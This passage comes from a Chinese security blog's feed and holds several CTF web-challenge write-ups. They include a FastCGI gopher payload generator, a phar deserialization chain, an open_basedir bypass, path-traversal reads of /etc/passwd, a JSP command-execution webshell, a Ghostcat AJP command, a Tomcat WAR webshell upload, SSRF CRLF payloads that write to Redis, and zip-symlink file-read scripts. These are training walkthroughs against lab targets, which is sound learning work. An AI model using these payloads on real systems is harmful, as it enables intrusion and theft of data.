<span class="string">'--code'</span>, help=<span class="string">'What php code your want to execute'</span>, default=<span class="string">'&lt;?php phpinfo(); exit; ?&gt;'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'FastCGI port'</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">"/"</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="string">'/'</span>),</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'DOCUMENT_ROOT'</span>: documentRoot,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>: <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_TYPE'</span>: <span class="string">'application/text'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>: <span class="string">"%d"</span> % len(content),</span><br><span class="line">        <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">        <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    response = urllib.quote(response)</span><br><span class="line">    print(<span class="string">"gopher://127.0.0.1:"</span> + str(args.port) + <span class="string">"/_"</span> + response)</span><br></pre></td></tr></table></figure><p>上面脚本来自<a href="https://evoa.me/archives/6/#PHP-FPM" target="_blank" rel="noopener">https://evoa.me/archives/6/#PHP-FPM</a> evoa师傅的博客</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> $url=<span class="string">"gopher://173.111.147.11:9000/_%01%01%D7%96%00%08%00%00%00%01%00%00%00%00%00%00%01%04%D7%96%01%DB%00%00%0E%02CONTENT_LENGTH18%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%D7%96%00%00%00%00%01%05%D7%96%00%12%00%00%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%01%05%D7%96%00%00%00%00"</span>;</span><br><span class="line">&#125;</span><br><span class="line">    @unlink(<span class="string">'phar.phar'</span>);</span><br><span class="line">    $obj = <span class="keyword">new</span> Main;</span><br><span class="line">    $p = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>, <span class="number">0</span>);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">    $p-&gt;setMetadata($obj);</span><br><span class="line">    $p-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">    $p-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><img src="/2020/07/30/NCTF2019-phar-matches-everything/6.png" class=""><p>可以看到成功访问到了phpinfo页面，看到了绝大多数系统命令执行函数被ban，发现<code>open_basedir：**/var/www/html:/tmp**</code></p><p>下面就是套绕过open_basedir的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;);?&gt;</span><br></pre></td></tr></table></figure><img src="/2020/07/30/NCTF2019-phar-matches-everything/7.png" class=""><p>再重新生成一下phar文件再传上去访问</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/8.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUSTCTF2020</title>
      <link href="/2020/07/28/WUSTCTF2020/"/>
      <url>/2020/07/28/WUSTCTF2020/</url>
      
        <content type="html"><![CDATA[<h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb<a id="more"></a></h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>JSP</li><li>CVE-2020-1938幽灵猫文件包含</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题，是一个文件上传，任意上传一个文件，回得到一个链接，点击可以进行下载</p><p>测试发现存在任意文件读取，可以任意下载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2f1070d6-bc24-4d35-adb5-15c7449d3e83.node3.buuoj.cn&#x2F;download?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>在配置文件中没有发现存在的用户，也就不能够下载.bash_history,也就意味着通过查看history文件来获取flag路径走不通了</p><p>测试发现是Tomcat/8.5.42，8009端口是开放的，看了一下题解是考察CVE-2020-1938幽灵猫文件包含</p><p>问星盟里的师傅要了个poc，用ajpshooter可以进行包含</p><p>上传一个jsp文件拿到路径</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span>%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(<span class="string">"Executing command"</span>);</span><br><span class="line">Process p = Runtime.getRuntime().exec(<span class="string">"ls / -al"</span>);</span><br><span class="line">OutputStream os = p.getOutputStream();</span><br><span class="line">InputStream in = p.getInputStream();</span><br><span class="line">DataInputStream dis = <span class="keyword">new</span> DataInputStream(in);</span><br><span class="line">String disr = dis.readLine();</span><br><span class="line"><span class="keyword">while</span> ( disr != <span class="keyword">null</span> ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr = dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><img src="/2020/07/28/WUSTCTF2020/1.png" class=""><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://<span class="number">2</span>f1070d6-bc24-<span class="number">4</span>d35-adb5-<span class="number">15</span>c7449d3e83.node3.buuoj.cn:<span class="number">8009</span>/ <span class="number">8009</span> /WEB-INF/uploads/b33c1c1f-<span class="number">22</span>ee-<span class="number">4369</span>-<span class="number">95</span><span class="built_in">cd</span>-<span class="number">945</span>e941a65bb.jsp eval</span><br></pre></td></tr></table></figure><p>再用内网靶机打的时候总是提示说连接失败，不知道咋回事，就先不管了</p><p>下面的步骤很简单，拿到路径之后，读取flag文件，再打一次过去就可以了</p><h2 id="WUSTCTF2020-Train-Yourself-To-Be-Godly"><a href="#WUSTCTF2020-Train-Yourself-To-Be-Godly" class="headerlink" title="[WUSTCTF2020]Train Yourself To Be Godly"></a>[WUSTCTF2020]Train Yourself To Be Godly</h2><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul><li><p>tomcat目录穿越</p></li><li><p>TOMCAT管理端弱口令</p></li><li><p>后台上传war木马</p></li><li><p>Cookie</p></li></ul><h2 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="TOMCAT目录穿越"><a href="#TOMCAT目录穿越" class="headerlink" title="TOMCAT目录穿越"></a>TOMCAT目录穿越</h3><p>根据image师傅的wp找到了Orange师傅在BlackHat上作的议题(<a href="https://www.youtube.com/watch?v=28xWcRegncw" target="_blank" rel="noopener">DEF CON 26 – Orange Tsai – Breaking Parser Logic Take Your Path Normalization Off and Pop 0Days Out</a>)有时间的都可以去瞻仰风采顺便学习一波知识</p><p>下面的总结来自视频</p><img src="/2020/07/28/WUSTCTF2020/2.png" class=""><p>Nginx 会解析 /a;evil/b/，并认为这是一个合法的目录请求，而 Tomcat 做解析的时候会自动忽略掉脏数据 ;.*，所以 Tomcat 对此的解析是 /a/b/。也就是说我们从可以通过写 ;+脏数据的方式绕过 Nginx 的反向代理，从而请求本不应该能请求到的非法路径</p><p>下面这张图片简单明了</p><img src="/2020/07/28/WUSTCTF2020/3.png" class=""><p>所以第一层目录穿越/..;/可以来到上层目录，也就能够来到后台</p><h3 id="TOMCAT管理端弱口令"><a href="#TOMCAT管理端弱口令" class="headerlink" title="TOMCAT管理端弱口令"></a>TOMCAT管理端弱口令</h3><p>根据做题经验，一般是弱口令或者默认口令，用户名一般就是tomcat，然后爆破一下得到密码也是tomcat</p><h3 id="后台上传war木马"><a href="#后台上传war木马" class="headerlink" title="后台上传war木马"></a>后台上传war木马</h3><p><a href="https://github.com/LandGrey/webshell-detect-bypass，用这里面的poc" target="_blank" rel="noopener">https://github.com/LandGrey/webshell-detect-bypass，用这里面的poc</a></p><p>把jsp打包压缩成war文件，burp抓包上传</p><img src="/2020/07/28/WUSTCTF2020/4.png" class=""><p>可以发现是自动进行了路径拼接，去掉example继续访问</p><img src="/2020/07/28/WUSTCTF2020/5.png" class=""><p>返回401，Unauthorized</p><p>这里是一个新知识点，<a href="https://www.jianshu.com/p/4cd42f7359f4，详细介绍" target="_blank" rel="noopener">https://www.jianshu.com/p/4cd42f7359f4，详细介绍</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic base64encode(username+&quot;:&quot;+password)</span><br></pre></td></tr></table></figure><p>所以加上头字段就行</p><p>这时候会发现返回403，路径访问到了，却无法访问，一般情况下就是权限不够，缺少cookie，这里加上cookie字段，如果还是403，再刷新一下cookie进行添加即可</p><img src="/2020/07/28/WUSTCTF2020/6.png" class=""><p>可以看到上传的1.war已经上传加载完成了，接下来就是访问🐎在的路径了</p><img src="/2020/07/28/WUSTCTF2020/7.png" class=""><p>到这里可以看到路径都没有错，但是还是不能访问，猜测这里可能还是要进行目录穿越，加上/..;/成功</p><img src="/2020/07/28/WUSTCTF2020/8.png" class=""><p>在根目录下找到flag，和原题还是不太一样，原题这里还有一个小trick，这里直接读就行了</p><img src="/2020/07/28/WUSTCTF2020/9.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> WUST </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PASECA2019-honey-shop</title>
      <link href="/2020/07/27/PASECA2019-honey-shop/"/>
      <url>/2020/07/27/PASECA2019-honey-shop/</url>
      
        <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点<a id="more"></a></h2><ul><li>flask_session</li><li>linux下的当前进程环境变量查看</li></ul><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>打开题目，是一个购买页面，抓个包</p><img src="/2020/07/27/PASECA2019-honey-shop/1.png" class=""><p>看到session的格式不用想就是flask_session，接下来就是要找到secret_key来伪造session达到修改金钱的目的</p><p>接着网页源代码看一下，发现有提示</p><img src="/2020/07/27/PASECA2019-honey-shop/2.png" class=""><p>存在download路径可以下载图片</p><p>这里就是最后的利用点了</p><p>先来看一下/etc/passwd</p><img src="/2020/07/27/PASECA2019-honey-shop/3.png" class=""><p>这里没有其他用户也没有bash，就不能知晓python的路径，这里就要用到当前进程的环境变量</p><img src="/2020/07/27/PASECA2019-honey-shop/4.png" class=""><p>拿到了secret_key,伪造session</p><img src="/2020/07/27/PASECA2019-honey-shop/5.png" class=""><p>在题目页面替换一下cookie就能购买flag了</p><img src="/2020/07/27/PASECA2019-honey-shop/6.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF-2016-Web7</title>
      <link href="/2020/07/27/SWPUCTF-2016-Web7/"/>
      <url>/2020/07/27/SWPUCTF-2016-Web7/</url>
      
        <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点<a id="more"></a></h2><ul><li>urllib2.urlopen()不支持gopher协议</li><li>urllib2.urlopen()未考虑换行符</li><li>redis写数据的方法</li></ul><h2 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h2><p>python2.7.5+redis2.6</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'niexinming'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cherrypy</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web7</span>:</span></span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;script&gt; window.location.href='/input';&lt;/script&gt;"</span></span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">input</span><span class="params">(self,url=<span class="string">""</span>,submit=<span class="string">""</span>)</span>:</span></span><br><span class="line">        file=open(<span class="string">"index.html"</span>,<span class="string">"r"</span>).read()</span><br><span class="line">        reheaders=<span class="string">""</span></span><br><span class="line">        <span class="keyword">if</span> cherrypy.request.method==<span class="string">"GET"</span>:</span><br><span class="line">            reheaders=<span class="string">""</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            url=cherrypy.request.params[<span class="string">"url"</span>]</span><br><span class="line">            submit=cherrypy.request.params[<span class="string">"submit"</span>]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> urllib2.urlopen(url).info().headers:</span><br><span class="line">                    reheaders=reheaders+x+<span class="string">"&lt;br&gt;"</span></span><br><span class="line">            <span class="keyword">except</span> Exception,e:</span><br><span class="line">                reheaders=<span class="string">"错误"</span>+str(e)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> urllib2.urlopen(url).info().headers:</span><br><span class="line">                reheaders=reheaders+x+<span class="string">"&lt;br&gt;"</span></span><br><span class="line">        file=file.replace(<span class="string">"&lt;?response?&gt;"</span>,reheaders)</span><br><span class="line">        <span class="keyword">return</span> file</span><br><span class="line"><span class="meta">    @cherrypy.expose</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self,password=<span class="string">""</span>,submit=<span class="string">""</span>)</span>:</span></span><br><span class="line">        pool = redis.ConnectionPool(host=<span class="string">'127.0.0.1'</span>, port=<span class="number">6379</span>)</span><br><span class="line">        r = redis.Redis(connection_pool=pool)</span><br><span class="line">        re=<span class="string">""</span></span><br><span class="line">        file=open(<span class="string">"login.html"</span>,<span class="string">"r"</span>).read()</span><br><span class="line">        <span class="keyword">if</span> cherrypy.request.method==<span class="string">"GET"</span>:</span><br><span class="line">            re=<span class="string">""</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password=cherrypy.request.params[<span class="string">"password"</span>]</span><br><span class="line">            submit=cherrypy.request.params[<span class="string">"submit"</span>]</span><br><span class="line">            <span class="keyword">if</span> r.get(<span class="string">"admin"</span>)==password:</span><br><span class="line">                re=open(<span class="string">"flag"</span>,<span class="string">'r'</span>).readline()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                re=<span class="string">"Can't find admin:"</span>+password+<span class="string">",fast fast fast....."</span></span><br><span class="line">        file=file.replace(<span class="string">"&lt;?response?&gt;"</span>,re)</span><br><span class="line">        <span class="keyword">return</span> file</span><br><span class="line">cherrypy.config.update(&#123;<span class="string">'server.socket_host'</span>: <span class="string">'0.0.0.0'</span>,</span><br><span class="line">                        <span class="string">'server.socket_port'</span>: <span class="number">8080</span>,</span><br><span class="line">                       &#125;)</span><br><span class="line">cherrypy.quickstart(web7(),<span class="string">'/'</span>)</span><br></pre></td></tr></table></figure><p>分析上面的代码，可以发现我们有两个输入的地方，第一个是输入url，urllib2.urlopen()会对我们输入的url进行访问，如果不符合的话就会报错。第二个对方就是登录检验，如果能够成功登录的话就会给到flag。这里应该是要ssrf+redis了，但是注意到urllib2.open()不支持gopher协议，就打不到redis。查资料找到了一篇文章，<a href="https://bugs.python.org/issue30458，借用文章的例子，urllib2.open()是不会处理换行符的" target="_blank" rel="noopener">https://bugs.python.org/issue30458，借用文章的例子，urllib2.open()是不会处理换行符的</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">urlopen(<span class="string">"http://localhost:8000/ HTTP/1.1\r\nHEADER: INJECTED\r\nIgnore:"</span>)</span><br><span class="line"></span><br><span class="line">Data sent to the server:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>server.bind((<span class="string">"localhost"</span>, <span class="number">8000</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>server.listen()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[conn, addr] = server.accept()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pprint(conn.recv(<span class="number">300</span>).splitlines(keepends=<span class="literal">True</span>))</span><br><span class="line">[<span class="string">b'GET / HTTP/1.1\r\n'</span>,</span><br><span class="line"> <span class="string">b'HEADER: INJECTED\r\n'</span>,</span><br><span class="line"> <span class="string">b'Ignore: HTTP/1.1\r\n'</span>,</span><br><span class="line"> <span class="string">b'Accept-Encoding: identity\r\n'</span>,</span><br><span class="line"> <span class="string">b'User-Agent: Python-urllib/3.5\r\n'</span>,</span><br><span class="line"> <span class="string">b'Connection: close\r\n'</span>,</span><br><span class="line"> <span class="string">b'Host: localhost:8000\r\n'</span>,</span><br><span class="line"> <span class="string">b'\r\n'</span>]</span><br></pre></td></tr></table></figure><p>所以这里用换行符也就是%0d%0a,插入到正常的url中就可以绕过了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload：http:&#x2F;&#x2F;127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379&#x2F;foo</span><br></pre></td></tr></table></figure><p>这里打过去之后要快速登录，就能拿到flag，因为后台有脚本在不断修改密码</p><img src="/2020/07/27/SWPUCTF-2016-Web7/1.png" class=""><p>当然也可以用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = <span class="string">"http://web7.08067.me/web7/input"</span></span><br><span class="line">            data = &#123;<span class="string">'value'</span>: <span class="string">'http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0aSET%20admin%20xx00%0d%0aSAVE%0d%0a:6379/foo'</span>&#125;</span><br><span class="line">            requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = <span class="string">"http://web7.08067.me/web7/admin"</span></span><br><span class="line">            data = &#123;<span class="string">'passworld'</span>: <span class="string">'xx00'</span>&#125;</span><br><span class="line">            text = requests.post(url, data=data).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> text:</span><br><span class="line">                <span class="keyword">print</span> text</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target=test)</span><br><span class="line">    t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line">    list.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    t = threading.Thread(target=test2)</span><br><span class="line">    t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line">    list.append(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">    i.join()</span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><a href="https://www.anquanke.com/post/id/84814" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84814</a></li><li><a href="https://bugs.python.org/issue30458" target="_blank" rel="noopener">https://bugs.python.org/issue30458</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF-2018-Hideandseek</title>
      <link href="/2020/07/22/HCTF-2018-Hideandseek/"/>
      <url>/2020/07/22/HCTF-2018-Hideandseek/</url>
      
        <content type="html"><![CDATA[<p>最近做的题发现对于linux整个系统架构的要求比较高，得抽时间好好学习一下了<a id="more"></a></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li><strong>flask-cookie伪造session，加解密</strong></li><li><strong>zip软链接构造任意文件读取</strong></li><li><strong>伪随机种子破解</strong></li><li><strong>linux系统目录的熟悉</strong></li></ul><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>开题，admin不能登录，任意写一个账号密码登录跳转到上传界面，要求上传zip文件</p><img src="/2020/07/22/HCTF-2018-Hideandseek/1.png" class=""><p>随便压缩一个txt文件，其中内容为peguin</p><img src="/2020/07/22/HCTF-2018-Hideandseek/2.png" class=""><p>可以发现后台应该是对上传的压缩文件进行了解压缩和文件的读取</p><p>查找一下资料，找到一篇blog<a href="https://www.cnblogs.com/Silkage/p/13218598.html" target="_blank" rel="noopener">https://www.cnblogs.com/Silkage/p/13218598.html</a></p><p>主要讲解了有关zip软链接的用法，借用文中的知识我们进行一下构造，读取一下目标服务器的/etc/passwd信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;etc&#x2F;passwd passwd</span><br><span class="line">生成一个指向&#x2F;etc&#x2F;passwd文件的软链接</span><br><span class="line">zip -y passwd.zip passwd</span><br><span class="line">将软链接进行压缩</span><br></pre></td></tr></table></figure><img src="/2020/07/22/HCTF-2018-Hideandseek/3.png" class=""><p>这里借用一下找来的生成脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">'http://9ca78698-fdea-4321-8dbc-6ee2e38b1de3.node3.buuoj.cn/upload'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makezip</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">'ln -s '</span>+sys.argv[<span class="number">1</span>]+<span class="string">' exp'</span>)</span><br><span class="line">    os.system(<span class="string">'zip --symlinks exp.zip exp'</span>)</span><br><span class="line">makezip()</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'the_file'</span>:open(<span class="string">'./exp.zip'</span>,<span class="string">'rb'</span>)&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    res = requests.post(url,files=files)</span><br><span class="line">    print(res.text)</span><br><span class="line">exploit()</span><br><span class="line">os.system(<span class="string">'rm -rf 